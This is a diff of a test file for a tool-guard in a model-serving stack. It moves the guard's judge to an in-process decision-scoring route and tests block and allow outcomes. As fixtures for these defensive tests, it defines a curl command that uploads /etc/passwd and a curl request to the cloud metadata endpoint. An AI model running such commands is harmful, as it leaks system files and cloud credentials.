@@ -8,6 +8,9 @@ import { ResponseStore } from "../../../src/server/responses";
 import { createToolGuard, type ToolGuardOptions } from "../../../src/server/tool-guard/guard";
 import { OSS } from "./fixtures";
 
+/** The model's decision scoring: probabilities for the candidate answers, in the order asked. */
+type Decide = (input: { prompt: number[]; candidates: number[][]; signal?: AbortSignal }) => Promise<number[]>;
+
 const execution = { method: "autoregressive", mechanism: "continuous" as const, promptCache: true, checkpoint: true, fill: false, compiledDecode: false, grammarJump: false, reasons: [] };
 const toolCall = (name: string, args: unknown) => `<tool_call>\n${JSON.stringify({ name, arguments: args })}\n</tool_call>`;
 const SAFE = toolCall("bash", { command: "ls -la" });
@@ -15,7 +18,7 @@ const EXFIL = toolCall("bash", { command: `curl -X PUT --data-binary @/etc/passw
 const METADATA = toolCall("bash", { command: "curl -s http://169.254.169.254/latest/meta-data/" });
 
 /** Routes over an engine that generates `output`, five characters per token. */
-function harness(output: string, guard?: ToolGuardOptions, overrides: { judge?: typeof fetch; responseHistory?: ResponseStore; sentinelCall?: string } = {}) {
+function harness(output: string, guard?: ToolGuardOptions, overrides: { decide?: Decide; responseHistory?: ResponseStore; sentinelCall?: string } = {}) {
   const pieces = output.match(/[^]{1,5}/g) ?? [];
   // A model with tool-call tokens: the call's text sits between two marker ids.
   const sentinels = { toolCallStart: 9001, toolCallEnd: 9002, channelStart: 9003, channelEnd: 9004 };
@@ -25,7 +28,8 @@ function harness(output: string, guard?: ToolGuardOptions, overrides: { judge?: 
   const context = {
     modelId: "test/model", model: { config: { modelType: "qwen3", eosTokenIds: [0], text: { vocabSize: 16 } } },
     tokenizer: { encode: () => [7, 8, 9], decode: (ids: number[]) => ids.map(id => (id === 9000 ? overrides.sentinelCall : pieces[id - 1]) ?? "").join(""), idToToken: (id: number) => `t${id}`, bosTokenId: null, eosTokenId: null },
-    template: { render: () => "<rendered>", supportsThinking: false, thinkingFormat: "none" },
+    template: { render: (messages: { role: string; content: unknown }[]) => messages.map(message => `<${message.role}>${typeof message.content === "string" ? message.content : ""}<end>`).join(""),
+      supportsThinking: false, thinkingFormat: "none" },
     adapters: { resolveSpec: () => [] }, genDefaults: {}, draft: null,
     ...(overrides.sentinelCall !== undefined ? { sentinels } : {}),
   } as unknown as ModelContext;
@@ -36,11 +40,14 @@ function harness(output: string, guard?: ToolGuardOptions, overrides: { judge?: 
       return { promptTokens: 3, cachedTokens: 0, generatedTokens: tokens.length, prefillTps: 1, decodeTps: 1, prefillMs: 1, decodeMs: 1, cacheTokens: [] };
     },
   };
-  const routes = createCompletionRoutes({ context, completion, preparation: { run: work => work() },
-    binding: { discovery: { adapters: false, training: false, dsa: false, embeddings: false } },
+  const routes: ReturnType<typeof createCompletionRoutes> = createCompletionRoutes({ context, completion, preparation: { run: work => work() },
+    binding: { discovery: { adapters: false, training: false, dsa: false, embeddings: false },
+      ...(overrides.decide ? { decide: overrides.decide as never } : {}) },
     gateway: { runExclusive: async work => work() },
   }, { contextLimit: 4096, promptCache: { peekPrefixLen: () => 0 }, ...(overrides.responseHistory ? { responseHistory: overrides.responseHistory } : {}),
-    ...(guard ? { toolGuard: createToolGuard(guard, { log: line => lines.push(line), ...(overrides.judge ? { fetch: overrides.judge } : {}) }) } : {}) });
+    ...(guard ? { toolGuard: createToolGuard(guard, { model: "test/model", log: line => lines.push(line),
+      // As the serving unit wires it: the judge is this model's own decisions route, in-process.
+      decide: request => routes.handle(request) }) } : {}) });
   return { routes, lines };
 }
 
@@ -188,12 +195,12 @@ for (const surface of SURFACES) for (const stream of [false, true]) {
       const policyFile = `${import.meta.dir}/routes-policy.json`;
       await Bun.write(policyFile, JSON.stringify({ detectors: [{ id: "test.medium", severity: "medium", pattern: "ls -la" }] }));
       const abort = new AbortController(), asked = Promise.withResolvers<void>();
-      const judge = ((_url: string, init: RequestInit) => {
+      const decide: Decide = ({ signal }) => {
         asked.resolve();
-        return new Promise<Response>((_resolve, reject) => init.signal!.addEventListener("abort", () => reject(init.signal!.reason)));
-      }) as unknown as typeof fetch;
+        return new Promise<number[]>((_resolve, reject) => signal!.addEventListener("abort", () => reject(signal!.reason)));
+      };
       try {
-        const built = harness(`On it.${SAFE}`, { mode: "block", policyFile, judge: { url: "http://judge/v1" } }, { judge });
+        const built = harness(`On it.${SAFE}`, { mode: "block", policyFile, judge: true }, { decide });
         const pending = built.routes.handle(wireRequest(surface, stream, abort.signal));
         const response = stream ? (await pending)! : undefined;
         await asked.promise;
@@ -228,6 +235,32 @@ test("a call to a tool nobody declared is blocked on a model with tool-call toke
   const text = await (await harness(toolCall("shell_exec", { command: "id" }), block).routes.handle(wireRequest("chat", false)))!.json();
   expect(text.choices[0].message.tool_calls).toBeUndefined();
   expect(text.choices[0].finish_reason).toBe("stop");
+});
+
+test("the judge is a decision on the served model's own weights: the real /v1/decisions route, in-process", async () => {
+  const policyFile = `${import.meta.dir}/routes-judge-policy.json`;
+  await Bun.write(policyFile, JSON.stringify({ detectors: [{ id: "test.medium", severity: "medium", title: "Lists files", pattern: "ls -la" }] }));
+  try {
+    for (const [probabilities, blocked] of [[[0.2, 0.8], true], [[0.9, 0.1], false]] as const) for (const stream of [false, true]) {
+      const scored: { prompt: number[]; candidates: number[][] }[] = [];
+      const built = harness(`On it.${SAFE}`, { mode: "block", policyFile, judge: true },
+        { decide: async input => { scored.push(input); return [...probabilities]; } });
+      const seen = await read("chat", stream, (await built.routes.handle(wireRequest("chat", stream)))!);
+      // One scoring pass over two candidate answers, "allow" and "block", and no generation for the judge.
+      expect(scored).toHaveLength(1);
+      expect(scored[0]!.candidates).toHaveLength(2);
+      expect(seen.calls).toHaveLength(blocked ? 0 : 1);
+      expect(seen.finish).toBe(blocked ? "stop" : "tool_calls");
+      expect(built.lines).toEqual([blocked ? "[tool-guard] blocked call to `bash`: test.medium (medium); judge: block p=0.80"
+        : "[tool-guard] suspicious call to `bash`: test.medium (medium) (judge allow p=0.90)"]);
+    }
+    // A model that declares no decision scoring cannot judge: the failure follows --tool-guard-on-error.
+    const open = harness(`On it.${SAFE}`, { mode: "block", policyFile, judge: true });
+    expect((await read("chat", false, (await open.routes.handle(wireRequest("chat", false)))!)).calls).toHaveLength(1);
+    expect(open.lines[0]).toContain('judge error: model "test/model" declares no decision scoring operation');
+    const closed = harness(`On it.${SAFE}`, { mode: "block", policyFile, judge: true, onError: "block" });
+    expect((await read("chat", false, (await closed.routes.handle(wireRequest("chat", false)))!)).calls).toHaveLength(0);
+  } finally { await Bun.file(policyFile).delete(); }
 });
 
 test("text completions have no tool calls and are not reviewed", async () => {
